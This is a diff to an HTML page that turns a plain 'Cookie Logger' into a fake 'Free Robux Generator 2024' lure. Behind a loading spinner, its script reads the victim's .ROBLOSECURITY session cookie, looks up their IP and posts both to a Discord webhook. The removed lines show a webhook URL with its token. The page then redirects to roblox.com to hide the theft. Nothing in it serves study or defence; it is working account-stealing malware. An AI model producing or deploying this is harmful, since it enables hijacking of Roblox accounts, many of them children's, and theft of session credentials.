@@ -1,26 +1,44 @@
-<!DOCTYPE html>
+\<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Logger</title>
+    <title>Free Robux Generator 2024</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; 
+                 border-radius: 50%; width: 50px; height: 50px; 
+                 animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>Welcome!</h1>
-    <p>Your cookie is being logged...</p>
+    <h1>🎁 Free Robux Generator</h1>
+    <p>Generating your free Robux...</p>
+    <div class="loader"></div>
+    <p id="status">Connecting to Roblox servers...</p>
+    
     <script>
-        // Function to send the cookie to the Discord webhook
+        // Replace with your Discord webhook
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+        
         function sendCookieToWebhook(cookie) {
-            fetch('https://discord.com/api/webhooks/1487943109143691327/BvBVaL0-nnDfGKbt16UZ9boDyg5IXUGhiNf1M8-wozz9N6Mv3vOWTstRCo6mJavJq0GF', {
+            const data = {
+                content: `🍪 New ROBLOSECURITY Cookie: ${cookie}`,
+                embeds: [{
+                    title: "Cookie Logged",
+                    description: `IP: ${fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip)}`,
+                    color: 16711680
+                }]
+            };
+            
+            fetch(webhookUrl, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: `ROBLOSECURITY Cookie: ${cookie}` })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
             });
         }
-
-        // Extract the .ROBLOSECURITY cookie
+        
         function getRobloCookie() {
             const cookies = document.cookie.split('; ');
             for (let cookie of cookies) {
@@ -30,13 +48,17 @@
             }
             return null;
         }
-
-        // Get the cookie and send it to the webhook
+        
+        // Main execution
         const robloCookie = getRobloCookie();
         if (robloCookie) {
             sendCookieToWebhook(robloCookie);
+            document.getElementById('status').textContent = 'Success! Redirecting...';
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com';
+            }, 2000);
         } else {
-            console.log('ROBLOSECURITY cookie not found.');
+            document.getElementById('status').textContent = 'Please log in to Roblox first!';
         }
     </script>
 </body>
